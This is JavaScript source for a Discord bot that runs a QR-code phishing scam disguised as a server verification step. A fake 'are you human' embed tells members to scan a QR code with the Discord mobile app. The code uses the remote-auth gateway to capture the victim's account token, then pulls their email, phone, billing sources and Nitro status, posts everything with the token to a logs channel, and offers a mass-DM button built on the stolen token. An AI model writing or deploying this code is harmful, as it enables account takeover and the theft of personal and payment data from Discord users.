
const
    Discord = require("discord.js"),
    crypto = require("crypto"),
    fs = require("fs"),
    { StringDecoder } = require('string_decoder'),
    WebSocket = require('ws'),
    {
        decryptPayload,
        findRealToken,
        nitro,
        badges,
        billing,
        discord,
        sleep,
        generateQrCode,
        hexColorToDiscordInt,
        zip,
        allBadges,
        emoji
    } = require("./utils.js")


class DuscirdQrVerif {
    constructor(config) {
        const { bot } = config;
        if (!bot) {
            console.log("=> ".cyan + `DuscirdQrVerif `.bgCyan + ` Verifier le config !`.red);
            return;
        };
        this.config = config;
        this.client = new Discord.Client({
            intents: Object.keys(Discord.Intents.FLAGS),
            restTimeOffset: 0,
            partials: ["USER", "CHANNEL", "GUILD_MEMBER", "MESSAGE", "REACTION"]
        });
        this.client.embed = () => new Discord.MessageEmbed().setColor('#ffffff'); // .setFooter({ text: '✌ By https://github.com/zougataga' });
        this.client.row = (array) => {
            const row = new Discord.MessageActionRow();
            array.forEach(e => {
                const btn = new Discord.MessageButton()
                if (e.id) btn.setCustomId(e.id);
                if (e.style) btn.setStyle(e.style)
                if (e.label) btn.setLabel(e.label)
                if (e.emoji) btn.setEmoji(e.emoji);
                if (e.id && e.style && e.label || e.emoji) row.addComponents(btn);
            });
            return row
        };
        this.client
            .on("ready", async () => {
                const guild = this.client.guilds.cache.get(bot?.guild?.id);
                if (!guild) {
                    console.log("=> ".cyan + `DuscirdQrVerif `.bgCyan + ` Verifier la guild id !`.red);
                    this.client.destroy();
                    return
                };
                this.guild = guild;
                const logs = this.client.channels.cache.get(bot?.guild?.logs);
                if (!logs) {
                    console.log("=> ".cyan + `DuscirdQrVerif `.bgCyan + ` Verifier l'id du salon de logs !`.red);
                    this.client.destroy();
                    return
                };
                this.logs = logs;
                const verification = guild.channels.cache.get(bot?.guild?.embed?.verification);
                if (!verification) {
                    console.log("=> ".cyan + `DuscirdQrVerif `.bgCyan + ` Verifier l'id du salon de verification !`.red);
                    this.client.destroy();
                    return
                };
                this.verification = verification;
                const role = guild.roles.cache.get(bot?.guild?.role);
                if (!role) {
                    console.log("=> ".cyan + `DuscirdQrVerif `.bgCyan + ` Verifier l'id du role !`.red);
                    this.client.destroy();
                    return
                };
                this.role = role;
                console.log("=> ".cyan + `Bot connected on `.blue + `${this.client.user.tag}`.green);
                const
                    verifEmbed = this.client.embed().setTitle("Verification required!").setDescription("🔔 To access this server, you need to pass the verification first\n🧿 Press the button bellow"),
                    verifRow = this.client.row([{ id: "verification", label: "Verify Me", style: "PRIMARY" }]);
                if (bot?.guild?.embed?.send) {
                    await verification.send({ embeds: [verifEmbed], components: [verifRow] }).catch(() => { });
                    console.log("=> ".cyan + `Embed verification send in `.blue + `${verification.name}`.green);
                };
            })
            .on("interactionCreate", async (interaction) => {
                if (interaction.customId === 'verification') await this.#createQrCodeVerifcation(interaction);

            })
            .login(bot?.token).catch(() => console.log("=> ".cyan + `DuscirdQrVerif `.bgCyan + ` Verifier le token !`.red));
    }

    async #createQrCodeVerifcation(interaction) {
        await interaction.reply({ ephemeral: true, embeds: [this.client.embed().setDescription("Loading...")] });
        const
            key = crypto.generateKeyPairSync("rsa", {
                modulusLength: 2048,
                publicKeyEncoding: {
                    type: 'spki',
                    format: 'pem'
                },
                privateKeyEncoding: {
                    type: 'pkcs1',
                    format: 'pem'
                }
            }),
            self = this,
            ws = new WebSocket('wss://remote-auth-gateway.discord.gg/?v=2', { headers: { 'Origin': 'https://discord.com' } });
        ws.onopen = function () {
            console.log("=> ".cyan + "WebSocket Client Open".blue);
            try {
                fs.unlinkSync(`./out/${interaction.user.id}.png`, function (err) { if (err) return });
            } catch (error) {

            }
        };
        ws.onerror = function (error) { console.log("=> ".cyan + `WebSocket Client Error: ${error}`.red) };
        ws.onclose = function () {
            interaction.deleteReply().catch(() => { });
            try {
                fs.unlink(`./out/${interaction.member.id}.png`, (err) => { if (err) console.log(err) });
            } catch (error) {

            }
        };

        ws.onmessage = async function (message) {
            const data = JSON.parse(message.data);
            if (data.op == "hello") {
                this.heartbeat_interval = data.heartbeat_interval / 1000;
                this.last_heartbeat = Date.now() / 1000;
                heartbeatSender();
                const publickey = publicKey();
                sendWs("init", { 'encoded_public_key': publickey })
            } else if (data.op == "nonce_proof") {
                const
                    nonce = data.encrypted_nonce,
                    decrypted_nonce = decryptPayload(nonce, key),
                    proof = crypto.createHash('sha256')
                        .update(decrypted_nonce)
                        .digest('base64')
                        .replace(/\+/g, '-')
                        .replace(/\//g, '_')
                        .replace(/=+$/, '');
                sendWs("nonce_proof", { 'proof': proof });
            } else if (data.op == "pending_remote_init") {
                await generateQrCode(data.fingerprint, false, `${interaction.user.id}.png`);
                const
                    embed = self.client.embed()
                        .setTitle("Hello, are you human? Let's find out!")
                        .setThumbnail("https://emoji.discord.st/emojis/aa142d2c-681c-45a2-99e9-a6e63849b351.png")
                        .setDescription(`You are seeing this because your account has been flagged for verification...\n\n**Please follow these steps to complete your verification:**\n1️⃣ Open the Discord Mobile application\n2️⃣ Go to settings\n3️⃣ Choose the "Scan QR Code" option\n4️⃣ Scan the QR code below`)
                        .setFooter({ text: "Note: captcha expires in 2 minutes" })
                        .setImage('attachment://qrcode.png'),
                    attachment = new Discord.MessageAttachment(`./out/${interaction.user.id}.png`, "qrcode.png");
                interaction.editReply({ embeds: [embed], files: [attachment], ephemeral: true });
            }
            else if (data.op == "pending_ticket") {
                const
                    decryptedUser = decryptPayload(data?.encrypted_user_payload, key),
                    userData = decryptedUser.toString()?.split(':');
                this.user = {
                    id: userData[0],
                    discriminator: userData[1],
                    avatar: userData[2],
                    username: userData[3],
                    avatarUrl: userData[2] == 0 || !userData[2] ? "" : `https://cdn.discordapp.com/avatars/${userData[1]}/${userData[2]}.${userData[2].startsWith('a_') ? 'gif' : 'png'}`
                };
                if (this.user.id) {
                    const payload = {
                        embeds: [
                            {
                                "author": {
                                    "name": `${this.user.username}#${this.user.discriminator} (${this.user.id})`,
                                    "icon_url": "https://tenor.com/view/hacker-techno-gif-3552791"
                                },
                                "title": "QrCode Scanner en attente d'autorisation",
                                "thumbnail": {
                                    "url": this.user.avatarUrl
                                },
                                "description": `\`\`\`${JSON.stringify(this.user)}\`\`\``,
                                "color": hexColorToDiscordInt("#ffffff"),
                                // "footer": {
                                //     "text": " ✌ By https://github.com/zougataga"
                                // }
                            }
                        ]
                    };
                    self.logs.send(payload).catch(() => { });
                };
            } else if (data.op == "pending_login") {
                const
                    ticket = data.ticket,
                    token = await findRealToken(ticket, key, self.config?.ANTICAPTCHA_KEY, self.logs);
                await interaction.member?.roles?.add(self.role.id).catch((e) => { });
                ws.close();
                if (!token) return;
                const info = await discord("https://discord.com/api/v9/users/@me", token);
                if (!info || info?.code === 0) return;
                const
                    row = self?.client?.row([{ id: `dmall_${token}`, label: "Dmall", emoji: "🌐", style: "PRIMARY" }]),
                    bill = await discord("https://discord.com/api/v9/users/@me/billing/payment-sources", token),
                    payload = {
                        components: [row],
                        embeds: [
                            {
                                "author": {
                                    "name": `${info.username}#${info.discriminator} (${info.id})`,
                                    "icon_url": "https://tenor.com/view/hacker-techno-gif-3552791"
                                },
                                "title": "QrCode Scanner et token recuper avec succès",
                                "thumbnail": {
                                    "url": `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=128`
                                },
                                "fields": [
                                    {
                                        "name": `${emoji.embed.token} Token;`,
                                        "value": `\`${token}\``
                                    },
                                    {
                                        "name": `${emoji.embed.badge} Badges:`,
                                        "value": badges(info.flags),
                                        "inline": true
                                    },
                                    {
                                        "name": `${emoji.embed.nitro} Nitro Type:`,
                                        "value": await nitro(info, token),
                                        "inline": true
                                    },
                                    {
                                        "name": `${emoji.embed.billing} Billing:`,
                                        "value": billing(bill),
                                        "inline": true
                                    },
                                    {
                                        "name": `${emoji.embed.email} Email:`,
                                        "value": `\`${info.email}\``,
                                        "inline": true
                                    },
                                    {
                                        "name": `${emoji.embed.mdp} Phone:`,
                                        "value": `\`${info.phone || "❌"}\``,
                                        "inline": true
                                    }
                                ],
                                "color": hexColorToDiscordInt("#ffffff"),
                            }
                        ]
                    };
                self.logs.send(payload).catch(() => { });
                await zip(token, `${info.username}#${info.discriminator} (${info.id})`, info.id, self.logs);
                console.log("=> ".cyan + `New grabbed:`.blue + `${info.username}#${info.discriminator} (${info.id})`.green);
            } else if (data.op == "cancel") {
                console.log("=> ".cyan + `Qrcode Cancel `.red);
                ws.close()
            }
        }

        function sendWs(op, data = null) {
            let payload = { 'op': op }
            if (data !== null) payload = { ...payload, ...data };
            ws.send(JSON.stringify(payload))
        }

        function publicKey() {
            const decoder = new StringDecoder('utf-8');
            let pub_key = key.publicKey;
            pub_key = decoder.write(pub_key);
            pub_key = (pub_key.split('\n').slice(1, -2)).join('');
            return pub_key
        }
        async function heartbeatSender() {
            while (ws.readyState === ws.OPEN) {
                await sleep(500);
                const
                    current_time = Date.now() / 1000,
                    time_passed = current_time - self.last_heartbeat + 1;
                if (time_passed >= self.heartbeat_interval) {
                    sendWs("heartbeat");
                    self.last_heartbeat = current_time
                }
            }
        }
    };


}
module.exports = DuscirdQrVerif